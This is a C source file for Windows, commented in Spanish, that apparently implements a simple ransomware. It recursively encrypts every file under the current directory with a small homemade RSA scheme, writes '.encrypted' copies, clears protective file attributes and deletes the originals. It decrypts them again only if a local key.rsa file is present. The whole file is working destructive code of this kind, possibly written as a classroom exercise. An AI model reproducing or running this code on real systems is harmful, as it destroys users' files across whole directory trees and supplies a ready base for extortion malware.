/**
 * @author Ricardo Román <reroman4@gmail.com>
 */

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "debug.h"
#include "rsa.h"

///< Número de elementos para un búfer
#define SIZE	4096

char *progName; ///< Apuntador a argv[0]

typedef enum{
	ENCRYPT,
	DECRYPT
} Operation;


/**
 * Cifra un archivo y da como resultado un nuevo archivo con
 * extensión .encrypted.
 *
 * @param srcName Ruta y nombre del archivo a cifrar.
 * @param file Datos del archivo original.
 * @param keys Llaves de cifrado a utilizar.
 *
 * @return 0 en caso de éxito, -1 en caso de error.
 */
int encryptFile( const TCHAR *srcName, const WIN32_FIND_DATA *file, const RSAKeys *keys )
{
	char fileName[MAX_PATH];
	int read;
	int written;
	FILE *f_in;
	FILE *f_out;
	uint16_t *buffer;
	uint32_t *result;
	
	if( !(f_in = fopen( srcName, "rb" )) ){
		derror( srcName );
		return -1;
	}

	strncpy( fileName, srcName, MAX_PATH );
	strcat( fileName, ".encrypted" );
	if( !(f_out = fopen( fileName, "wb" )) ){
		derror( fileName );
		fclose( f_in );
		return -1;
	}

	fwrite( &file->nFileSizeLow, sizeof(DWORD), 1, f_out );
	buffer = malloc( SIZE * sizeof(uint16_t) );
	result = malloc( SIZE * sizeof(uint32_t) );
	while( !feof(f_in) ){
		if( (read = fread( buffer, 1, SIZE * sizeof(uint16_t), f_in )) < 0 ){
			derror( "fread" );
			fclose( f_in );
			fclose( f_out );
			free( buffer );
			free( result );
			remove( fileName );
			return -1;
		}
		int nElem = read / sizeof(uint16_t) + (read % sizeof(uint16_t) ? 1 : 0);

		for( int i = 0 ; i < nElem ; i++ )
			result[i] = encrypt( buffer[i], keys );

		written = 0;
		do{
			written += fwrite( result + written, sizeof(uint32_t), nElem - written, f_out );
		}while( written < nElem );
	}
	fclose( f_in );
	fclose( f_out );
	free( buffer );
	free( result );
	SetFileAttributes( fileName, file->dwFileAttributes );
	return 0;
}

/**
 * Descifra un archivo .encrypt, reescribiendo el archivo original sin la
 * extensión .encrypted.
 *
 * @param srcName Ruta y nombre del archivo a descifrar.
 * @param file Datos del archivo cifrado.
 * @param keys Llaves de cifrado a utilizar.
 *
 * @return 0 en caso de éxito, -1 en caso de error.
 */
int decryptFile( const TCHAR *srcName, const WIN32_FIND_DATA *file, const RSAKeys *keys )
{
	char fileName[MAX_PATH];
	int read, toWrite;
	int written;
	FILE *f_in;
	FILE *f_out;
	DWORD originalFileSize;
	uint32_t *buffer;
	uint16_t *result;
	
	if( !(f_in = fopen( srcName, "rb" )) ){
		derror( srcName );
		return -1;
	}

	strncpy( fileName, srcName, MAX_PATH );
	char *ext = strstr( fileName, ".encrypted" );
	if( !ext ){
		fclose( f_in );
		debug( "%s no es un archivo cifrado\n", fileName );
		return -1;
	}
	*ext = '\0';

	if( !(f_out = fopen( fileName, "wb" )) ){
		derror( fileName );
		fclose( f_in );
		return -1;
	}

	if( fread( &originalFileSize, sizeof(DWORD), 1, f_in ) < 1 ){
		debug( "%s No hay tamanio de archivo", fileName );
		fclose( f_in );
		fclose( f_out );
		remove( fileName );
		return -1;
	}
	buffer = malloc( SIZE * sizeof(uint32_t) );
	result = malloc( SIZE * sizeof(uint16_t) );
	char *bytes = (char*) result;
	while( originalFileSize > 0 ){
		if( (read = fread( buffer, sizeof(uint32_t), SIZE, f_in )) < 0 ){
			derror( "fread" );
			fclose( f_in );
			fclose( f_out );
			remove( fileName );
			free( buffer );
			free( result );
			return -1;
		}

		for( int i = 0 ; i < read ; i++ )
			result[i] = decrypt( buffer[i], keys );

		toWrite = read * sizeof(uint16_t);
		if( (int)(originalFileSize - toWrite) < 0 )
			toWrite--;

		written = 0;
		do{
			written += fwrite( bytes + written, 1, toWrite - written, f_out );
		}while( written < toWrite );
		originalFileSize -= toWrite;
	}
	fclose( f_in );
	fclose( f_out );
	free( buffer );
	free( result );
	SetFileAttributes( fileName, file->dwFileAttributes );
	return 0;

}

/**
 * Escanea en de forma recursiva en busca de archivos para (des)cifrarlos.
 *
 * @param dirName Ruta del directorio a explorar sin backslash final.
 * @param keys Apuntador a las llaves a utiliza para el (des)cifrado.
 * @param op Operación a realizar. ENCRYPT o DECRYPT.
 *
 * @return 0 en caso contrario; -1 en caso de error.
 */
int processDir( const TCHAR *dirName, const RSAKeys *keys, Operation op )
{
	WIN32_FIND_DATA fd;
	TCHAR strDir[MAX_PATH];
	HANDLE handle;
	char *ext;
	const DWORD noAttrs = ~FILE_ATTRIBUTE_HIDDEN & ~FILE_ATTRIBUTE_READONLY &
		~FILE_ATTRIBUTE_SYSTEM & ~FILE_ATTRIBUTE_ARCHIVE;
	DWORD attrs = FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN |
                  FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM;

	strncpy( strDir, dirName, MAX_PATH );
	debug( "Procesando directorio %s", dirName );
	strcat( strDir, "\\*" );

	if( (handle = FindFirstFile( strDir, &fd )) == INVALID_HANDLE_VALUE ){
		debug( "FindFirstFile Error: %s", strDir );
		return -1;
	}

	do{
		ext = strstr( fd.cFileName, ".encrypted" );
		snprintf( strDir, MAX_PATH, "%s\\%s", dirName, fd.cFileName );

		if( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ){
		   	if(	strcmp( TEXT("."), fd.cFileName ) && 
					strcmp( TEXT(".."), fd.cFileName ) ){
				debug( "Procesando directorio %s\n", strDir );
				processDir( strDir, keys, op );
			}
		}
		else if( strcmp(fd.cFileName, "key.rsa" ) && 
				!strstr( progName, fd.cFileName ) &&
				fd.dwFileAttributes & attrs ){
			int res = -1;
			if( op == ENCRYPT && !ext ){
				debug( "Cifrando archivo %s", strDir );
				res = encryptFile( strDir, &fd, keys );
			}
			else if( op == DECRYPT && ext ){
				debug( "Descifrando archivo %s", strDir );
				res = decryptFile( strDir, &fd, keys );
			}
			if( res == 0 ){
				debug( "Eliminando archivo %s", strDir );
				SetFileAttributes( strDir, fd.dwFileAttributes & noAttrs );
				DeleteFile( strDir );
			}
		}
	}while( FindNextFile( handle, &fd ) );
	FindClose( handle );
	return 0;
}

/**
 * Cifra archivos del directorio actual y subdirectorios si no es
 * encontrado el archivo de claces key.rsa, de otra forma descifra
 * archivos utilizando la clave cargada.
 */
int main( int argc, char **argv )
{
	RSAKeys rsa;
	WIN32_FIND_DATA fd;
	HANDLE hfind = FindFirstFile( TEXT("key.rsa"), &fd );
	FILE *fileKey;

	progName = argv[0];

	if( hfind == INVALID_HANDLE_VALUE ){
		debug( "%s", "Creando nuevas claves" );
		createKeys( &rsa, 32 );

		if( !(fileKey = fopen( "key.rsa", "wb" )) ){
			derror( "key.rsa" );
			return -1;
		}
		fwrite( &rsa, sizeof(rsa), 1, fileKey );
		fclose( fileKey );
		debug( "e = %u\nd = %u\nn = %u\n", rsa.e, rsa.d, rsa.n );
		processDir( TEXT("."), &rsa, ENCRYPT );
	}
	else{
		FindClose( hfind );
		if( !(fileKey = fopen( "key.rsa", "rb" )) ){
			derror( "key.rsa" );
			return -1;
		}
		if( fread( &rsa, sizeof(rsa), 1, fileKey ) < 1 ){
			debug( "Error al leer llaves" );
			fclose( fileKey );
			return -1;
		}
		fclose( fileKey );
		debug( "e = %u\nd = %u\nn = %u\n", rsa.e, rsa.d, rsa.n );
		processDir( TEXT("."), &rsa, DECRYPT );
	}
	return 0;
}
